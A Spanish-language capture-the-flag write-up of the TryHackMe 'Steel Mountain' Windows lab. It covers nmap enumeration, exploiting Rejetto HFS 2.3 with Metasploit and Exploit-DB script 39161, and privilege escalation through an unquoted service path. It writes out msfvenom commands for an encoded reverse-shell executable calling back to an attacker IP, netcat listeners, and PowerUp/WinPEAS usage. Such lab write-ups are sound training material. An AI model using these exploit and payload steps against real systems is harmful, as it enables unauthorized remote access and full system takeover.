---
layout: single
title: Steel Mountain - Try Hack Me
excerpt: Steel Mountain maquina catalogada de dificultad “Easy” basada en la escalacion de privilegios en sistemas windows, en esta ocasión nos aprovecharemos de la vulnerabilidad Unquoted Service Path. Vamos a ello! 
date: 2021-12-31
classes: wide
header:
  teaser: /assets/images/thm-steelmountain/1.JPG
  teaser_home_page: true
  icon: /assets/images/thm.webp
categories:
  - TryHackMe
tags:  
  - Windows
  - powershell
  - nmap
  - metasploit
  - Easy
  
---

![](/assets/images/thm-steelmountain/1.JPG)

Steel Mountain maquina catalogada de dificultad “Easy” basada en la escalacion de privilegios en sistemas windows, en esta ocasión nos aprovecharemos de la vulnerabilidad Unquoted Service Path en español conocida como espacios en las rutas, a continuación veremos de que trata!

## 1-Escaneo Nmap.

Iniciamos la maquina y comezaremos enumerando todos los puertos con el comando: nmap -p- --open -T5 -v -n -Pn 10.10.180.90 -oN nmap.txt

Nmap nos devuelve todo esto:

```
nmap -p- --open -T5 -v -n -Pn 10.10.180.90 -oN nmap.txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-30 23:43 CET
Initiating Connect Scan at 23:43
Scanning 10.10.180.90 [65535 ports]
Connect Scan Timing: About 0.92% done
Discovered open port 49153/tcp on 10.10.180.90
Discovered open port 47001/tcp on 10.10.180.90
Discovered open port 5985/tcp on 10.10.180.90
Discovered open port 49154/tcp on 10.10.180.90
Discovered open port 49152/tcp on 10.10.180.90
Discovered open port 49164/tcp on 10.10.180.90
Discovered open port 49155/tcp on 10.10.180.90
Discovered open port 49163/tcp on 10.10.180.90
Discovered open port 49156/tcp on 10.10.180.90
Discovered open port 8080/tcp on 10.10.180.90
Discovered open port 3389/tcp on 10.10.180.90
Discovered open port 445/tcp on 10.10.180.90
Discovered open port 139/tcp on 10.10.180.90
Discovered open port 80/tcp on 10.10.180.90
Discovered open port 135/tcp on 10.10.180.90
Warning: 10.10.180.90 giving up on port because retransmission cap hit (2).
Completed Connect Scan at 23:44, 64.07s elapsed (65535 total ports)
Nmap scan report for 10.10.180.90
Host is up (0.040s latency).
Not shown: 64205 closed tcp ports (conn-refused), 1315 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8080/tcp  open  http-proxy
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49163/tcp open  unknown
49164/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 64.23 seconds
```

realizamos un escaneo con Nmap básico: nmap -sC -sV 10.10.180.90 - oN PortsNmap.txt

Utilizaremos los parametros -sC (Utilizar los scripts más comunes) -sV (Mostrar versiones) -o (Guardar archivo)

Nmap nos devuelve todo esto:

```
nmap -sC -sV 10.10.180.90 - oN PortsNmap.txt
 Nmap scan report for 10.10.180.90 (10.10.180.90)
Host is up (0.044s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2021-12-29T21:40:21
|_Not valid after:  2022-06-30T21:40:21
8080/tcp  open  http               HttpFileServer httpd 2.3
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49163/tcp open  unknown
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.90 seconds
```

Vemos que nos devuelve bastantes puertos abiertos. Algunos insteresantes son el puerto 80 (http) , 8080 (http file server), 139y445 (samba) entre otros...

En el puerto 80 , vemos que tenemos una pagina donde nos indica quien es el empleado del mes, pulsando ctrl + U, accedemos al código fuente y vemos que tenemos el nombre del empleado.

![](/assets/images/thm-steelmountain/2.JPG)

![](/assets/images/thm-steelmountain/3.JPG)

![](/assets/images/thm-steelmountain/4.JPG)

## 2-Ganando acceso a la maquina.

Vemos que en el puerto 8080 tenemos un servicio HttpFileServer httpd 2.3 , vamos a echar un ojo a la pagina web.

![](/assets/images/thm-steelmountain/5.JPG)

Vemos que tenemos una web corriendo el servicio indicado, vamos a buscar alguna vulnerabilidad.

Utilizando la herramienta searchsploit , vemos que tenemos una vulnerabilidad relacionada con la escalación de privilegios.

![](/assets/images/thm-steelmountain/6.JPG)

Si nos vamos a Exploit Database y la buscamos podemos dar con más información.

![](/assets/images/thm-steelmountain/7.JPG)

A continuación podriamos descargar el script y ejecutar el proceso manualmente, eso lo dejaremos para más tarde, comenzemos con metasploit.

Ejecutamos metasploit -> msfconsole , y vamos a buscar un exploit.

Con el comando "search", filtraremos por la vulnerabilidad deseada y con el comando "use" , utilizaremos el modulo que más nos interesa.

![](/assets/images/thm-steelmountain/8.JPG)

Con el comando "options", nos muestra las opciones, tendremos que cambiar el target IP, target Port y nuestra dirección local (tun0), utilizaremos el comando "set" para ello.

![](/assets/images/thm-steelmountain/9.JPG)

![](/assets/images/thm-steelmountain/10.JPG)

Nota: Si os da error probar a cambiar el "SRVPORT" , para indicar el puerto de escucha de nuestra maquina local, por ejemplo el 443.

Ejecutamos el exploit con "run" y esperamos.

Este nos devuelve una consola meterpreter.

![](/assets/images/thm-steelmountain/11.JPG)

Vemos que estamos con el usuario Bill, asi que vamos a vuscar su flag en C:\Users\bill\Desktop

![](/assets/images/thm-steelmountain/12.JPG)

![](/assets/images/thm-steelmountain/13.JPG)

## 3-Escalación de privilegios.

Utilizaremos la herramienta PowerUp para enumerar la maquina.

Primero subiremos el archivo a la maquina victima con el comando "upload". Recordar que actualmente estamos utilizando la consola meterpreter, por lo cual necesitamos la consola de windows powershell para poder ejecutar el programa, para ello activaremos el modulo de powershell -> load powershell , powershell_shell

![](/assets/images/thm-steelmountain/14.JPG)

Ejecutamos el programa utilizando 1- ". ./PowerUp.ps1" y 2- "Invoke-AllChecks".

Nos devuelve todo esto, los servicios del sistema.

```
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files
```

Nosotros nos quedaremos con este servicio , que no es por defecto de windows y además tenemos permisos con el usuario Bill.

```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```
Lo que vamos a tratar es de cambiar el programa ASCService.exe que es que ejecuta el sistema por uno nuestro malicioso, para obtener una reverse shell con privilegios utilizando un payload que crearemos con msfvenom.

msfvenom -p windows/shell_reverse_tcp LHOST=10.9.8.85 LPORT=4455 -e x86/shikata_ga_nai -f exe -o ASCService.exe

-p -> Indicamos que es un payload
-e -> Indicamos un tipo de codificacion
-f -> Indicamos el formato
-o -> Indicamos la salida (Nombre del archivo)

Lo subimos a la maquina objetivo con el comando "upload" como antes y lo movemos a su carpeta donde se va a ejecutar.

![](/assets/images/thm-steelmountain/15.JPG)

A continuacion vamos a parar el servicio, copiamos el archivo y lo volvemos a iniciar.

![](/assets/images/thm-steelmountain/16.JPG)

Si estamos en escucha con una interfaz de netcat en el puerto indicado en el payload, deberiamos obtener una revershell con privilegios de administrador.

![](/assets/images/thm-steelmountain/17.JPG)

![](/assets/images/thm-steelmountain/18.JPG)

![](/assets/images/thm-steelmountain/19.JPG)

## 4-Realizando la maquina sin metasploit.

Para realizar la maquina sin metasploit, tendremos que enumerarla con nmap y utilzar un exploit.

Utilizaremos la herramienta searchsploit para buscar algun exploit que nos pueda servir de utilidad.

![](/assets/images/thm-steelmountain/6.JPG)

En mi caso utilizaremos -> Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | windows/remote/39161.py

Utilizaremos searchsploit -m 39161 para bajarnos el exploit y echarle un vistazo.

Vemos que tiene información acerca de la vulnerabilidad y nos indica como ejecutar correctamente el exploit.

![](/assets/images/thm-steelmountain/20.JPG)

1-  Cambiaremos estas dos variables por nuestra dirección ip (tun0) y el puerto. (Recomiendo dejar el 443)

    ip_addr = "10.9.8.85" #local IP address
    local_port = "443" # Local Port number

2-Tenemos que tener un servidor web corriendo con el binario de netcat.exe, para ello nos iremos a la ruta /usr/share/windows-binaries y ejecutaremos el comando -> python3 -m httpserver 80

3-Tener una interfaz de netcat en escucha por el puerto 443 -> nc -lvnp 443

4-Ejecutar el exploit utilzando los parametros que nos indica -> python 39161.py 10.10.180.90 8080

![](/assets/images/thm-steelmountain/20.JPG)

Vemos que directamente nos devuelve una revershell.

![](/assets/images/thm-steelmountain/21.JPG)

Ahora vamos a utilizar la herramienta WinPeas para enumerar la maquina, primero para subirla utilizaremos el servicio samba.

![](/assets/images/thm-steelmountain/22.JPG)

Ejecutamos el programa y nos devuelve una salida enorme, pero principalmente nos vamos a centrar en la vulnerabilidad del servicio que ya conocemos.

![](/assets/images/thm-steelmountain/23.JPG)

Nos indica que este servicio tiene espacios en su ruta y que es vulnerable y que además tenemos permisos como bill.

¿Pero a que nos referimos con que tiene espacios en su ruta?

Si nos fijamos en la ruta que esta indicada a ejecutar -> C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe , contiene espacios entre directorios.

Program Files (x86) -> Program ESPACIO Files ESPACIO (x86) , Advanced SystemCare -> Advanced ESPACIO SystemCare , ¿Que significa esto?

El sistema windows va a buscar a traves de esa ruta un programa llamado "ASCService.exe" , al no indicar la ruta completa entre "". El sistema por defecto realizara la siguiente busqueda.

1-C:\Program 
-- ¿ASCService.exe?
2-C:\Program Files
-- ¿ASCService.exe?
3-C:\Program Files (x86)\IObit\Advanced
-- ¿ASCService.exe?
4-C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
-- ¿ASCService.exe?

Si tenemos permisos de escritura podriamos poner un binario malicioso en cualquiera de estas rutas para que compruebe primero nuestro binario.

con el comando icacls, vemos si tenemos comandos con bill para escribir.

![](/assets/images/thm-steelmountain/24.JPG)

Podemos realizar esta busqueda de directorios con la vulnerabilidad Unquoted Service Path, con la herramienta CVE - 2020-15261.

Utilizamos el comando -> wmic service get name,displayname,pathname,startmode |findstr /i
"auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

El programa busca binarios que no sean de windows por defecto y que no tenga comillas en las rutas.

![](/assets/images/thm-steelmountain/25.JPG)

Vemos que en el directorio C:\Program Files (x86)\IObit (El usuario Bill Nos indica la W de write , tenemos permisos de escritura así que nuevamente vamos a generar el archivo malicioso utilizando msfvenom y subiendolo a la maquina victima con sbm.

msfvenom -> msfvenom -p windows/shell_reverse_tcp LHOST=10.9.8.85 LPORT=4455 -f exe -e x86/shikata_ga_nai -o ASCService.exe

Nos pondremos en escucha por el puerto 4455 con la interfaz de netcat y vemos que ganamos acceso como Administrador.

![](/assets/images/thm-steelmountain/26.JPG)

![](/assets/images/thm-steelmountain/27.JPG)